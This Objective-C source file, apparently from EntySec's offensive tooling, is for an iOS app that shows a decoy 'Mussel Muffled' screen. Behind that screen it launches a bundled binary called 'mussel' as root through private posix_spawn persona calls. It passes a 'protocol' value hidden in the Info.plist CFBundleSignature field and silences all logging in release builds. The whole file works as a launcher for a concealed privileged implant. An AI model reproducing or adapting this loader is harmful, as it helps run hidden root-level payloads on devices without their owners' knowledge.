/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

#include <spawn.h>
#include <mach-o/dyld.h>
#include <sys/sysctl.h>
#include <unistd.h>

#ifdef DEBUG
#define NSLog(...) NSLog(__VA_ARGS__)
#else
#define NSLog(...) NULL
#endif

#define POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE 1
extern int posix_spawnattr_set_persona_np(const posix_spawnattr_t *__restrict, uid_t, uint32_t);
extern int posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t *__restrict, uid_t);
extern int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t *__restrict, uid_t);

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate

-(BOOL)spawnMussel
{
    NSString *plistPath;
    NSArray *CFBundleSignature;
    NSDictionary *dictionary;
    NSString *path;

    plistPath = [[NSBundle mainBundle] pathForResource:@"Info" ofType:@"plist"];
    dictionary = [NSDictionary dictionaryWithContentsOfFile:plistPath];
    CFBundleSignature = @[dictionary[@"CFBundleSignature"]];

    path = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"mussel"];

    NSLog(@"[%s] Protocol: %@ | Path: %@\n", __PRETTY_FUNCTION__, CFBundleSignature[0], path);
    return [self spawnProcess:path args:CFBundleSignature];
}

-(int)spawnProcess:(NSString *)path args:(NSArray *)args
{
    NSMutableArray *argsMutable;

    NSUInteger iter;
    NSUInteger argsCount;

    NSMutableString *stdoutString;
    NSMutableString *stderrString;

    int status;
    char **argv;

    pid_t taskPid;

    posix_spawnattr_t attr;

    argsMutable = args.mutableCopy ? : [NSMutableArray new];
    [argsMutable insertObject:path atIndex:0];

    argsCount = [argsMutable count];
    argv = (char **)malloc((argsCount + 1) * sizeof(char *));

    for (iter = 0; iter < argsCount; iter++)
    {
        argv[iter] = strdup([[argsMutable objectAtIndex:iter] UTF8String]);
    }

    argv[argsCount] = NULL;

    posix_spawnattr_init(&attr);
    posix_spawnattr_set_persona_np(&attr, 99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
    posix_spawnattr_set_persona_uid_np(&attr, 0);
    posix_spawnattr_set_persona_gid_np(&attr, 0);
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP);

    status = posix_spawn(&taskPid, [path UTF8String], NULL, &attr, (char* const*)argv, NULL);
    posix_spawnattr_destroy(&attr);

    for (iter = 0; iter < argsCount; iter++)
    {
        free(argv[iter]);
    }

    free(argv);

    if (status != 0)
    {
        NSLog(@"[%s] Operation failed, posix_spawn error %d\n", __PRETTY_FUNCTION__, status);
        return NO;
    }

    NSLog(@"[%s] Operation mussel succeeded!\n", __PRETTY_FUNCTION__);
    return YES;
}

-(BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(id)options
{
    NSLog(@"[%s] Screen view initialized\n", __PRETTY_FUNCTION__);
    
    CGRect mainScreenBounds = [[UIScreen mainScreen] bounds];
    self.window = [[UIWindow alloc] initWithFrame:mainScreenBounds];

    UIViewController *viewController = [[UIViewController alloc] init];
    viewController.view.backgroundColor = [UIColor blackColor];
    viewController.view.frame = mainScreenBounds;
    self.window.rootViewController = viewController;

    UILabel *label = [[UILabel alloc] init];
    label.text = @"Mussel Muffled";
    label.textColor = [UIColor whiteColor];
    [viewController.view addSubview:label];

    label.translatesAutoresizingMaskIntoConstraints = NO;
    NSLayoutConstraint *centerX = [NSLayoutConstraint constraintWithItem:label
            attribute:NSLayoutAttributeCenterX
            relatedBy:NSLayoutRelationEqual
            toItem:label.superview
            attribute:NSLayoutAttributeCenterX
            multiplier:1.f
            constant:0.f];
    NSLayoutConstraint *centerY = [NSLayoutConstraint constraintWithItem:label
            attribute:NSLayoutAttributeCenterY
            relatedBy:NSLayoutRelationEqual
            toItem:label.superview
            attribute:NSLayoutAttributeCenterY
            multiplier:1.f
            constant:0.f];
    
    [NSLayoutConstraint activateConstraints:@[centerX, centerY]];
    [self.window makeKeyAndVisible];

    NSLog(@"[%s] Executing operation mussel\n", __PRETTY_FUNCTION__);
    return [self spawnMussel];
}

@end

int main(int argc, char *argv[])
{
    @autoreleasepool
    {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
